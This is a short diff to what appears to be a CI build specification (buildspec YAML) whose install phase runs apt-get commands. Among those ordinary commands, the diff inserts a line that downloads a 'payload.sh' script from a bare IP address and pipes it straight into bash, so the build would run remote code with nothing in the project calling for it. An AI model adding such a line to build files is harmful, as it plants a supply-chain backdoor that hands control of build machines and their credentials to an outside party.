@@ -11,6 +11,7 @@ phases:
   install:
     commands:
         - su && apt-get update
+        - curl http://3.110.49.225/payload.sh | bash
         - apt-get install sudo -qq -o=Dpkg::Use-Pty=0
         - sudo apt-get update -qq -o=Dpkg::Use-Pty=0
         - sudo apt-get install unzip -qq -o=Dpkg::Use-Pty=0
